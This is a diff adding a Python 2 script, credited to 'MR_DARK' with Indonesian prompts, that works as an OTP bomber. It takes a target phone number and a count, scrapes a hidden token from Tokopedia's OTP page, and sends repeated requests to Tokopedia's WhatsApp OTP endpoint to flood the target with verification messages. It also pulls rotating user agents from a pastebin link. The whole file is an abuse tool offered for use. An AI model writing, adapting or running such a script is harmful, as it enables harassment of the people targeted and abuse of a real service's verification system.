@@ -1,0 +1,61 @@
+#!/usr/bin/python2
+# Hai Script By MR_DARK
+# Recode Tidak Akan Membuat Anda Menjadi Pencipta Kode :3
+
+from requests.exceptions import ConnectionError
+from time import sleep
+import requests
+import random
+import sys
+import os
+import re
+
+M = '\033[1;31m'
+H = '\033[1;32m'
+K = '\033[1;33m'
+U = '\033[1;34m'
+P = '\033[1;35m'
+C = '\033[1;36m'
+W = '\033[1;37m'
+A = '\033[90m'
+
+
+def main():
+	nomor = raw_input(''+U+'|\x1b[1;97mMASUKKAN NOMOR TARGET:\x1b[1;92m ')
+        jb = int(input('\x1b[1;94m|\x1b[1;97mMASUKAN JUMLAH:\x1b[1;92m'))
+	agent = requests.get('https://pastebin.com/raw/zkCXTGcm').text.split('\n')
+	acak = random.choice(agent)
+			
+	headers = {
+	'Connection' : 'keep-alive',
+	'Accept' : 'application/json, text/javascript, */*; q=0.01',
+	'Origin' : 'https://accounts.tokopedia.com',
+	'X-Requested-With' : 'XMLHttpRequest',
+	'User-Agent' : '{acak}',
+	'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8',
+	'Accept-Encoding' : 'gzip, deflate',
+	}
+			
+	site = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+nomor+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = headers).text
+	search = re.search(r'\<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>', site).group(1)
+			
+	data = {
+	'otp_type' : '116',
+	'msisdn' : nomor,
+	'tk' : search,
+	'email' : '',
+	'original_param' : '',
+	'user_id' : '',
+	'signature' : '',
+	'number_otp_digit' : '6',
+	}
+			
+	try:
+                for i in range(jb):
+      		    send = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = headers, data = data)
+		    print '\x1b[1;94m|\x1b[1;97mMessage:\033[1;92m', send.json()['error_message']
+	except:
+		print('\x1b[1;94m|'+M+'Terjadi Kesalahan !')
+		os.system("python tools.py")
+if __name__ == '__main__':
+	main()
